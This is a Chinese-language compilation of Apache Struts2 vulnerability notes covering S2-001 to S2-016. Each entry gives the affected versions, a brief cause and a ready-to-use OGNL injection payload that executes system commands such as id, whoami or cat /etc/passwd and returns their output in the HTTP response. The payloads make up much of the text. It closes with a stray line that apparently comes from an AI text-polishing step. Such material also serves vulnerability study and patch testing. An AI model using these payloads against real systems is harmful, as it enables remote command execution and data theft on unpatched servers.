## POC 和漏洞分析

### s2-016
#### 影响版本
- Struts 2.0.0 - Struts 2.3.15

#### 漏洞成因
`DefaultActionMapper` 类支持以 "action:"、"redirect:" 和 "redirectAction:" 作为导航或重定向前缀。然而，这些前缀后面可以跟随 OGNL 表达式，且 Struts2 对这些前缀没有进行过滤，导致可以通过 OGNL 表达式调用 Java 静态方法执行任意系统命令。

#### POC
```http
/example/HelloWorld.action?debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27ipconfig%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B500000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%20%23d.read%28%23e%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%20%2C%20%23d.read%28%23e%29%2C%23out.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%20%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29
```

### s2-015
#### 影响版本
- 2.0.0 - 2.3.14.2

#### 漏洞成因
基于通配符定义的动作映射，如果请求与任何其他定义的操作不匹配，它将匹配 "*" 并请求同名的 JSP 文件。

#### POC
```http
%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%2C%23q%7D.action
```

### s2-013
#### 影响版本
- Struts 2.0.0 - Struts 2.3.14

#### 漏洞成因
Struts 的标签 `s:a` 和 `s:url` 中有一个 `includeParams` 属性。当 `includeParams=all` 时，会将本次请求的 GET 和 POST 参数都放在 URL 的 GET 参数上。虽然可以通过 URL 解码知道参数内容，但 Struts 对 OGNL 进行了解析，从而导致任意代码执行。

#### POC
```http
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
${#_memberAccess["allowStaticMethodAccess"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
```

### s2-012
#### 影响版本
- 2.1.0 - 2.3.13

#### 漏洞成因
如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 `${param_name}` 作为重定向变量，例如 `/index.jsp?name=${name}`，Struts2 在获取 `${name}` 值的过程中会对 `name` 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。

#### POC
```http
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[500000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

### s2-009
#### 影响版本
- 2.1.0 - 2.3.1.1

#### 漏洞成因
该漏洞是 s2-003 和 s2-005 的延续。Struts2 对 s2-003 的修复方法是禁止 `#` 号，而 s2-005 通过使用编码 `\u0023` 或 `\43` 来绕过。Struts2 对 s2-005 的修复方法是禁止 `\` 等特殊符号，使用户不能提交反斜线。但是，如果当前 action 接受了某个参数 `example`，这个参数将进入 OGNL 上下文。因此，可以将 OGNL 表达式放在 `example` 参数中，然后使用 `/HelloWorld.acton?example=statement>&(example)('xxx')=1` 的方法来执行它，从而绕过官方对 `#`、`\` 等特殊字符的防御。

#### POC
```http
/ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true
```

### s2-008
#### 影响版本
- 2.1.0 - 2.3.1

#### 漏洞成因
主要是利用对传入参数没有严格限制，导致多个地方可以执行恶意代码。第一种情况是在异常处理时的 OGNL 执行。第二种是通过 cookie 方式，虽然 Struts2 没有对恶意代码进行限制，但 Java 的 web server（如 Tomcat）对 cookie 名称有较多限制，在传入 Struts2 之前就被处理。第四种需要开启 devMode debug 模式。

#### POC
```http
/S2-008/devmode.action?debug=command&expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29
```

### s2-007
#### 影响版本
- 2.0.0-2.2.3

#### 漏洞成因
当配置了验证规则且类型转换出错时，进行了错误的字符串拼接，进而造成了 OGNL 语句的执行。后端用代码拼接 `' + value + '` 然后对其进行 OGNL 表达式解析，类似于 SQL 注入单引号闭合插入语句。官方修复时也类似 SQL 注入，对单引号进行了转义。

#### POC
```http
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```

### s2-005
#### 影响版本
- 2.0.0-2.1.8.1

#### 漏洞成因
通过 Unicode 编码 `\u0023` 绕过 Struts 对 `#` 的过滤，再通过设置 `xwork.MethodAccessor.denyMethodExecution` 为 `false` 和 `memberAccess.allowStaticMethodAccess` 为 `true` 来绕过沙盒。

#### POC
```http
/example/HelloWorld.action?%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&%28%27%5Cu0023mycmd%5Cu003d%5C%27id%5C%27%27%29%28bla%29%28bla%29&%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29
```

### s2-001
#### 影响版本
- 2.0.0-2.0.8

#### 漏洞成因
用户提交表单数据并验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 `%{value}` 进行解析，然后重新填充到对应的表单数据中。

#### POC
```http
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

希望以上优化后的文本能够更清晰、连贯和专业地展示各个漏洞的信息。